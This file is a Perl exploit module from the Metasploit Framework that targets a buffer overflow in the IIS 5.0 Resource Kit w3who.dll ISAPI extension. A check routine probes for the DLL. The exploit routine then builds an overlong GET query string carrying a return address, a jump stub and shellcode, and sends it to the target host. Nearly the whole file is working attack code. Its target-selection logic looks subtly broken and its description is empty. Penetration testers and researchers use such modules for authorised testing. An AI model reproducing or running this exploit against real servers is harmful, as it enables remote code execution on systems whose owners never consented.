
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::iis50_w3who_overflow;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{
    'Name'  => 'IIS 5.0 w3who.dll Overflow',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 0,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 80],
                    'URL'   => [1, 'DATA', 'The URL to the DLL', '/scripts/w3who.dll'],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },
    'AutoOpts' => { 'EXITFUNC' => 'process' },
    'Payload' => {
                 'Space'     => 632,
                 'BadChars'  => "\x00+&=%\x0a\x0d\x20",
                 'MinNops'   => 128,
                 },
    
    'Description'  => Pex::Text::Freeform(qq{
    
    }),

    'Refs'  =>  [
                    'http://www.microsoft.com/windows2000/techinfo/reskit/tools/existing/w3who-o.asp',
              ],
    'DefaultTarget' => 0,
    'Targets' => [
                   ['Windows 2000 RESKIT',   748,  0x10019f4a],
                 ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_path = $self->GetVar('URL');
    
    my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host, 
        'PeerPort'  => $target_port, 
        'LocalPort' => $self->GetVar('CPORT'),
        'SSL'       => $self->GetVar('SSL'),
    );
    if ($s->IsError) {
      $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
      return $self->CheckCode('Connect');
    }

    $s->Send("GET $target_path HTTP/1.1\r\nHost: $target_host:$target_port\r\n\r\n");

    my $r = $s->Recv(-1, 5);

    if ($r =~ /Access Token/)
    {
        $self->PrintLine("[*] Found $target_path ;)");
        return $self->CheckCode('Detected');
    } else {
        
        $self->PrintLine("The w3who.dll ISAPI does not appear to be installed");
        return $self->CheckCode('Safe');
    }
}


sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_path = $self->GetVar('URL');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   =$self->GetVar('EncodedPayload')->Payload;

    my @targets = @{$self->Targets};
    if ($target_idx == 0)
    {
        shift(@targets);
    } else {
        @targets = ( $targets[$target_idx] );
    }

    foreach my $target (@targets)
    {
        $self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

        my $pattern = Pex::Text::PatternCreate(8192);
        # print "Offset: ".index($pattern, pack('V', 0x7a413979))."\n";
        
        $pattern = "\xcc" x 8192;
         
        my $jmp =
            "\x8b\x44\x24\x08".     # mov eax,[esp+0x8]
            "\x05\x10\xfd\xff\xff". # add eax,0xfffffd10
            "\xff\xe0";             # jmp eax
            
        substr($pattern, $target->[1] - 4, 4, "\x90\x90\xeb\x04");
        substr($pattern, $target->[1]    , 4, pack('V', $target->[2]));
        substr($pattern, $target->[1] + 4, length($jmp), $jmp);  
        substr($pattern, $target->[1] - 4 - length($shellcode), length($shellcode), $shellcode);
        
        
        my $request =
        "GET $target_path?$pattern HTTP/1.1\r\n".
        "Host: $target_host:$target_port\r\n\r\n";

        my $s = Msf::Socket::Tcp->new
        (
            'PeerAddr'  => $target_host, 
            'PeerPort'  => $target_port, 
            'LocalPort' => $self->GetVar('CPORT'),
            'SSL'       => $self->GetVar('SSL'),
        );
        if ($s->IsError) {
          $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
          return;
        }
    
        $self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
        $s->Send($request);
        
        $self->PrintLine("[*] Waiting for a response...");
        my $r = $s->Recv(-1, 5);
        sleep(2);
        $s->Close();
        exit(0);
    }
    
    return;
}
